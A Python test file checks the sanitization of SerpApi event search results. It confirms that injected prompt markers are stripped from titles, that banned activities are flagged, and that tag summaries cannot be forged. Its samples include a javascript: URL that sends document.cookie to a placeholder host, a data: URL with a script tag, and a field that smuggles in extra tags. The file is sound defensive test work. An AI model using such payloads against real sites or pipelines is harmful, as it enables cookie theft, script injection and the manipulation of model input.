"""SerpApi google_events parsing, sanitization and safety filters (P23 spec §5.1, §6)."""

import json
import pathlib

from app.models.event import SerpEvent
from app.services.serp_events import (
    banned_terms_hit,
    event_tags_summary,
    is_ticketed,
    parse_events,
    sanitize_event,
)

PAYLOAD = json.loads(
    (pathlib.Path(__file__).parent / "fixtures" / "serpapi_events_sample.json").read_text(
        encoding="utf-8"
    )
)


def test_parses_all_five_entries() -> None:
    assert len(parse_events(PAYLOAD)) == 5


def test_missing_events_results_returns_empty_not_raises() -> None:
    assert parse_events({"search_metadata": {}}) == []
    assert parse_events({}) == []


def test_malformed_entry_is_skipped_not_fatal() -> None:
    payload = {"events_results": [{"no_title": 1}, PAYLOAD["events_results"][0]]}
    assert len(parse_events(payload)) == 1


def test_sanitize_strips_injection_markers_from_title() -> None:
    injected = next(e for e in parse_events(PAYLOAD) if "SYSTEM" in e.title)
    clean = sanitize_event(injected)
    for marker in ("SYSTEM", "ignore", "output", "JSON", ":"):
        assert marker.lower() not in clean.title.lower()
    assert "pottery" in clean.title.lower()  # the real words survive
    assert len(clean.title) <= 60


def test_banned_terms_flags_climbing_and_passes_heritage_walk() -> None:
    events = [sanitize_event(e) for e in parse_events(PAYLOAD)]
    climbing = next(e for e in events if "climb" in e.title.lower())
    walk = next(e for e in events if "heritage" in e.title.lower())
    assert banned_terms_hit(climbing) == "climb"
    assert banned_terms_hit(walk) is None


def test_ticketed_entry_detected() -> None:
    entries = PAYLOAD["events_results"]
    events = parse_events(PAYLOAD)
    flags = [is_ticketed(entry, e) for entry, e in zip(entries, events, strict=True)]
    assert sum(flags) == 1


def test_tags_summary_is_machine_ish_and_capped() -> None:
    walk = sanitize_event(next(e for e in parse_events(PAYLOAD) if "heritage" in e.title.lower()))
    tags = event_tags_summary(walk, "heritage")
    assert tags.startswith("event=")
    assert "venue=" in tags and "when=" in tags and "heritage" in tags
    assert len(tags) <= 80
    assert ":" not in tags and "http" not in tags


# --- review fix pass ------------------------------------------------------------------------


def test_sanitize_event_drops_a_url_that_is_not_http() -> None:
    e = SerpEvent(title="Heritage Walk", url="javascript:fetch('//x/'+document.cookie)")
    assert sanitize_event(e).url is None


def test_sanitize_event_drops_a_data_url() -> None:
    e = SerpEvent(title="Heritage Walk", url="data:text/html,<script>alert(1)</script>")
    assert sanitize_event(e).url is None


def test_sanitize_event_keeps_an_https_url() -> None:
    e = SerpEvent(title="Heritage Walk", url="https://example.invalid/walk")
    assert sanitize_event(e).url == "https://example.invalid/walk"


def test_when_fragment_cannot_forge_other_tag_fields() -> None:
    e = SerpEvent(
        title="Night Walk",
        venue_name="Shaniwar Wada",
        when_text="Sat, Oct 11, 7:00 AM; kind=temple; indoor=yes",
    )
    summary = event_tags_summary(sanitize_event(e), None)
    assert "kind=temple" not in summary
    assert "indoor=yes" not in summary
